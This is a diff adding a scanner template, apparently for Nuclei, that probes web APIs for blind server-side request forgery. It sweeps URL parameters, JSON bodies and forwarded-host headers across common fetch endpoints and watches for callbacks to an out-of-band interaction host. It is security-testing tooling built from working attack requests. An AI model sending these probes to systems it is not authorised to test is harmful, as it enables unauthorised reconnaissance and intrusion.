@@ -1,0 +1,136 @@
+id: api-ssrf-check
+info:
+  name: Server-side fetch primitive discovery (blind SSRF via OOB)
+  author: specter-agent
+  severity: info
+  description: |
+    Sweeps URL-bearing parameters across common fetch-feature paths and reports where the
+    SERVER dereferences an out-of-band callback. Severity is `info` on purpose: what this
+    template establishes is that a fetch primitive EXISTS, which is the floor of the class
+    and not yet a finding (hunting Rule 32). Promote only after establishing the response
+    channel and internal reach -- see specter/.claude/skills/ssrf/SKILL.md.
+
+    The previous version of this template hardcoded a single path (`POST /api/v1/fetch`)
+    with three literal payloads, so on a real target it could essentially never fire. It
+    implied coverage that did not exist, which is worse than having no template.
+  reference:
+    - https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/
+    - https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
+  tags: api,ssrf,owasp-api7,oob,blind
+  metadata:
+    grimnir-playbook: ssrf-fetch-by-url
+    grimnir-evidence-class: ssrf
+
+http:
+  # ── 1. GET sweep: URL-bearing parameter across likely fetch paths ────────────
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}?{{param}}=http://{{interactsh-url}}/g"
+    payloads:
+      path:
+        - "/api/fetch"
+        - "/api/proxy"
+        - "/api/preview"
+        - "/api/unfurl"
+        - "/api/import"
+        - "/api/oembed"
+        - "/api/screenshot"
+        - "/api/thumbnail"
+        - "/api/convert"
+        - "/api/v1/fetch"
+        - "/api/v1/proxy"
+        - "/api/v1/preview"
+        - "/api/v1/import"
+        - "/oembed"
+        - "/unfurl"
+        - "/proxy"
+        - "/fetch"
+        - "/preview"
+        - "/import"
+        - "/render"
+      param:
+        - "url"
+        - "uri"
+        - "src"
+        - "target"
+        - "image_url"
+        - "remote_url"
+        - "callback"
+        - "endpoint"
+    attack: clusterbomb
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      # The ONLY reliable signal for a blind primitive: the target's own infrastructure
+      # connected to the OOB host. A 200 response proves nothing on its own.
+      - type: word
+        part: interactsh_protocol
+        name: oob-interaction
+        words:
+          - "http"
+          - "dns"
+        condition: or
+      - type: status
+        status: [200, 201, 202, 204, 301, 302, 400, 403, 500]
+    extractors:
+      - type: kval
+        part: interactsh_request
+        name: fetcher-ua
+        kval:
+          - user_agent
+
+  # ── 2. POST sweep: the same parameter names in a JSON body ──────────────────
+  - method: POST
+    path:
+      - "{{BaseURL}}{{path}}"
+    headers:
+      Content-Type: application/json
+    body: '{"{{param}}":"http://{{interactsh-url}}/p"}'
+    payloads:
+      path:
+        - "/api/fetch"
+        - "/api/proxy"
+        - "/api/import"
+        - "/api/preview"
+        - "/api/webhooks"
+        - "/api/v1/fetch"
+        - "/api/v1/import"
+        - "/api/v1/webhooks"
+        - "/webhooks"
+        - "/hooks"
+      param:
+        - "url"
+        - "uri"
+        - "callback_url"
+        - "webhook_url"
+        - "remote_url"
+        - "target_url"
+    attack: clusterbomb
+    stop-at-first-match: false
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: oob-interaction
+        words:
+          - "http"
+          - "dns"
+        condition: or
+
+  # ── 3. Header-driven variant: no URL parameter anywhere ─────────────────────
+  # A server-rendered framework that rebuilds its own absolute base URL from the request
+  # will dial the host you supply. See playbook ssrf-host-header-framework.
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-Host: {{interactsh-url}}
+        X-Original-Host: {{interactsh-url}}
+        X-Forwarded-Server: {{interactsh-url}}
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: host-header-oob
+        words:
+          - "http"
+          - "dns"
+        condition: or
